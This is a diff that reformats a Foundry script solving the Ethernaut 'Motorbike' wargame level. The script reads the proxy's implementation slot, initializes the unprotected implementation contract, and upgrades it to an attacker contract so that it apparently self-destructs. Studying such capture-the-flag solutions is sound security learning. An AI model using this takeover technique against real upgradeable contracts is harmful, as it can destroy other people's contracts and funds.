@@ -1,18 +1,22 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.6.0;
 
-import { Script } from "forge-std/Script.sol";
-import { EthernautScript } from "src/common/EthernautScript.sol";
+import {Script} from "forge-std/Script.sol";
+import {EthernautScript} from "src/common/EthernautScript.sol";
 
 interface IMotorbike {
     function initialize() external;
-    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
+    function upgradeToAndCall(address newImplementation, bytes memory data)
+        external
+        payable;
 }
 
 contract Solution {
     function killIt(IMotorbike _implementation) public {
         _implementation.initialize();
-        _implementation.upgradeToAndCall(address(this), abi.encodeWithSignature("destruction()"));
+        _implementation.upgradeToAndCall(
+            address(this), abi.encodeWithSignature("destruction()")
+        );
     }
 
     function destruction() public {
@@ -21,10 +25,11 @@ contract Solution {
 }
 
 contract SolutionScript is EthernautScript {
-
     function solve(address payable _instanceAddress) internal override {
-        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
-        address implementation = address(uint160(uint256(vm.load(_instanceAddress, implementationSlot))));
+        bytes32 implementationSlot =
+            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+        address implementation =
+            address(uint160(uint256(vm.load(_instanceAddress, implementationSlot))));
         assert(implementation != address(0));
 
         vm.startBroadcast();
@@ -38,12 +43,11 @@ contract SolutionScript is EthernautScript {
         validateInstance = false;
     }
 
-    function getLevelAddress() internal view override returns(address) {
+    function getLevelAddress() internal view override returns (address) {
         return 0x58Ab506795EC0D3bFAE4448122afa4cDE51cfdd2;
     }
 
-    function getCreationValue() internal view override returns(uint256) {
+    function getCreationValue() internal view override returns (uint256) {
         return 0;
     }
 }
-
